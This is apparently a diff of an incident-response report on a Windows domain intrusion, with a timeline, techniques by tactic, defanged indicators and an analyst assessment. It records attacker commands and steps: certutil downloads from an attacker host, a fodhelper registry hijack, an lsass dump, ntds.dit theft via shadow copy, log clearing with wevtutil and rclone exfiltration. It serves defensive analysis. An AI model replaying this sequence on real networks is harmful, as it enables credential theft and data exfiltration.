+| `2026-01-30 23:35:15.307` | `EC2AMAZ-EEU3IA2` | `ntds.dit` copied from shadow copy |
+| `2026-01-30 23:35:17.505` | `EC2AMAZ-EEU3IA2` | Shadow copy deleted |
+| `2026-01-30 23:38:11.819` | `EC2AMAZ-EEU3IA2` | Domain user `svc_backup` created |
+| `2026-01-30 23:39:37.986` | `EC2AMAZ-EEU3IA2` | `svc_backup` added to `Domain Admins` |
+| `2026-01-30 23:45:25.132` | `EC2AMAZ-EEU3IA2` | `net use Z:` with plaintext `EMBERFORGE\Administrator` credentials |
+| `2026-01-30 23:47:38.302` | `EC2AMAZ-EEU3IA2` | Scheduled task `WindowsUpdate` created |
+| `2026-01-30 23:50:50.010` | `EC2AMAZ-EEU3IA2` | `wevtutil cl Security` |
+| `2026-01-30 23:51:06.258` | `EC2AMAZ-EEU3IA2` | `wevtutil cl System` |
+| `2026-01-30 23:52:00.378` | `EC2AMAZ-EEU3IA2` | `Security` log cleared again |
 
 ## Nature of the Attack
 
@@ -778,14 +821,14 @@ The first confirmed malicious execution was:
 "C:\Windows\System32\rundll32.exe" D:\review.dll,StartW
 ```
 
-That activity was followed by deployment of `C:\Users\Public\update.exe`.
+That execution chain was followed by deployment of `C:\Users\Public\update.exe`.
 
 ### Persistence
 
-Persistence mechanisms observed in the reviewed telemetry included:
+Persistence observed in the reviewed telemetry included:
 
 - Installation and configuration of `AnyDesk`
-- A scheduled task named `WindowsUpdate` on the Domain Controller
+- Creation of a scheduled task named `WindowsUpdate`
 - Creation of the backdoor account `svc_backup`
 
 ### Privilege Escalation
@@ -797,27 +840,29 @@ HKCU\Software\Classes\ms-settings\shell\open\command
 DelegateExecute
 ```
 
+They later gained and used domain-level administrative privilege through creation of `svc_backup` and addition of that account to `Domain Admins`.
+
 ### Defense Evasion
 
-Defense evasion behavior included:
+Defense evasion included:
 
 - Process injection
 - Use of direct syscalls for credential dumping
 - Service-based remote execution with random temporary service names
 - Deletion of the Volume Shadow Copy after `ntds.dit` access
-- Clearing of `Security` and `System` event logs with `wevtutil.exe`
+- Clearing of the `Security` and `System` event logs
 
 ### Credential Access
 
 Credential access included:
 
 - Creation of `C:\Windows\System32\lsass.dmp`
-- Copying of `ntds.dit` from a shadow copy on the Domain Controller
+- Copying `ntds.dit` from a Volume Shadow Copy on the Domain Controller
 - Exposure of plaintext credentials in process command lines
 
 ### Discovery
 
-Discovery commands included:
+Discovery activity included:
 
 ```text
 hostname
@@ -832,19 +877,20 @@ nltest /dclist:emberforge.local
 Lateral movement included:
 
 - Copying `update.exe` to `\\10.1.57.66\C$\Users\Public\update.exe`
-- Share creation and SMB enablement
+- Creating the `tools` share on `C:\Users\Public`
+- Opening inbound SMB on TCP 445
+- Using share mapping on the Domain Controller with plaintext credentials
 - Service-based remote execution on the server
-- Share mapping on the Domain Controller using plaintext credentials
 
 ### Collection
 
-Collection behavior centered on the server directory:
+Collection focused on the server directory:
 
 ```text
 C:\GameDev
 ```
 
-That directory was compressed into:
+That content was compressed into:
 
 ```text
 C:\Users\Public\gamedev.zip
@@ -852,7 +898,7 @@ C:\Users\Public\gamedev.zip
 
 ### Command and Control
 
-Command-and-control or beacon-like activity was observed through DNS queries from `C:\Users\Public\update.exe` to:
+Beacon-like communication was observed through DNS queries from `C:\Users\Public\update.exe` to:
 
 ```text
 cdn[.]cloud-endpoint[.]net
@@ -860,57 +906,22 @@ cdn[.]cloud-endpoint[.]net
 
 ### Exfiltration
 
-Exfiltration was performed with `rclone.exe` to MEGA using:
+Exfiltration was carried out with `rclone.exe` to MEGA using:
 
 ```text
 mega:exfil
 ```
 
-And network telemetry tied it to:
+And tied to the following destination:
 
 ```text
 bt5[.]api[.]mega[.]co[.]nz
 66[.]203[.]125[.]15
 ```
 
-## Technical Timeline
+### Impact
 
-| Time (UTC) | Host | Activity |
-|---|---|---|
-| `2026-01-30 21:24:04.656` | `EC2AMAZ-B9GHHO6` | `7zG.exe` extracts content into `C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\` |
-| `2026-01-30 21:24:10.848` | `EC2AMAZ-B9GHHO6` | `EmberForge_Review.iso` created |
-| `2026-01-30 21:27:03.300` | `EC2AMAZ-B9GHHO6` | `rundll32.exe` executes `D:\review.dll,StartW` |
-| `2026-01-30 21:32:42.708` | `EC2AMAZ-B9GHHO6` | `rundll32.exe > notepad.exe` injection |
-| `2026-01-30 21:36:34.586` | `EC2AMAZ-B9GHHO6` | `C:\Users\Public\update.exe` created |
-| `2026-01-30 21:38:33.686` | `EC2AMAZ-B9GHHO6` | Registry hijack for `ms-settings\shell\open\command` begins |
-| `2026-01-30 21:39:02.511` | `EC2AMAZ-B9GHHO6` | `fodhelper.exe` executes |
-| `2026-01-30 21:40:24.206` | `EC2AMAZ-B9GHHO6` | `update.exe` begins querying `cdn[.]cloud-endpoint[.]net` |
-| `2026-01-30 21:48:13.892` | `EC2AMAZ-B9GHHO6` | `Update.exe` creates `C:\Windows\System32\lsass.dmp` |
-| `2026-01-30 21:56:44.706` | `EC2AMAZ-B9GHHO6` | `update.exe > spoolsv.exe (NT AUTHORITY\SYSTEM)` |
-| `2026-01-30 22:07:45.9754850Z` | `EC2AMAZ-16V3AU4` | Temporary service `MzLblBFm` appears on server |
-| `2026-01-30 22:10:52.789` | `EC2AMAZ-16V3AU4` | `certutil.exe` downloads `AnyDesk.exe` from `sync[.]cloud-endpoint[.]net` |
-| `2026-01-30 22:14:55.324` | `EC2AMAZ-B9GHHO6` | `update.exe` copied to server over `\\10.1.57.66\C$` |
-| `2026-01-30 22:17:01.4134194Z` | `EC2AMAZ-16V3AU4` | PowerShell `IWR` downloads `update.exe` on server |
-| `2026-01-30 22:18:01.9717240Z` | `EC2AMAZ-16V3AU4` | `certutil.exe` downloads `update.exe` on server |
-| `2026-01-30 22:19:34.895` | `EC2AMAZ-B9GHHO6` | `AnyDesk.exe` installed on workstation |
-| `2026-01-30 22:51:36.903` | `EC2AMAZ-B9GHHO6` | `tools` share created on `C:\Users\Public` |
-| `2026-01-30 22:54:09.948` | `EC2AMAZ-B9GHHO6` | Inbound SMB firewall rule added |
-| `2026-01-30 23:08:28.665` | `EC2AMAZ-16V3AU4` | `rclone.exe` run with plaintext MEGA credentials |
-| `2026-01-30 23:11:28.112` | `EC2AMAZ-16V3AU4` | `Compress-Archive` stages `C:\GameDev` into `gamedev.zip` |
-| `2026-01-30 23:11:44.379` | `EC2AMAZ-16V3AU4` | `rclone.exe` uploads `gamedev.zip` to MEGA |
-| `2026-01-30 23:12:53.154` | `EC2AMAZ-16V3AU4` | `rclone.exe` connects to `bt5[.]api[.]mega[.]co[.]nz` at `66[.]203[.]125[.]15` |
-| `2026-01-30 23:19:21.118` | `EC2AMAZ-EEU3IA2` | First observed command on DC, `whoami` |
-| `2026-01-30 23:34:56.069` | `EC2AMAZ-EEU3IA2` | `vssadmin list shadows /for=C:` |
-| `2026-01-30 23:35:04.575` | `EC2AMAZ-EEU3IA2` | `vssadmin create shadow /For=C:` |
-| `2026-01-30 23:35:15.307` | `EC2AMAZ-EEU3IA2` | `ntds.dit` copied from shadow copy |
-| `2026-01-30 23:35:17.505` | `EC2AMAZ-EEU3IA2` | Shadow copy deleted |
-| `2026-01-30 23:38:11.819` | `EC2AMAZ-EEU3IA2` | Domain user `svc_backup` created |
-| `2026-01-30 23:39:37.986` | `EC2AMAZ-EEU3IA2` | `svc_backup` added to `Domain Admins` |
-| `2026-01-30 23:45:25.132` | `EC2AMAZ-EEU3IA2` | `net use Z:` with plaintext `EMBERFORGE\Administrator` credentials |
-| `2026-01-30 23:47:38.302` | `EC2AMAZ-EEU3IA2` | Scheduled task `WindowsUpdate` created |
-| `2026-01-30 23:50:50.010` | `EC2AMAZ-EEU3IA2` | `wevtutil cl Security` |
-| `2026-01-30 23:51:06.258` | `EC2AMAZ-EEU3IA2` | `wevtutil cl System` |
-| `2026-01-30 23:52:00.378` | `EC2AMAZ-EEU3IA2` | `Security` log cleared again |
+The clearest confirmed impact in the reviewed telemetry was theft of data from `C:\GameDev` on the server and compromise of domain credential material through access to `ntds.dit`.
 
 ## Analyst Assessment
 
@@ -931,5 +942,4 @@ What remains less certain from the reviewed notes:
 
 - The full origin of the archive that produced `EmberForge_Review.iso` wasn't reconstructed before extraction.
 - `AnyDesk` was clearly installed and configured, but the reviewed telemetry doesn't fully show the extent of interactive use.
-- No alternate exfiltration path was confirmed in the reviewed dataset, but that shouldn't be treated as proof that none existed outside the reviewed time window or telemetry source.
-
+- No alternate exfiltration path was confirmed in the reviewed dataset, but that should not be treated as proof that none existed outside the reviewed time window or telemetry source.
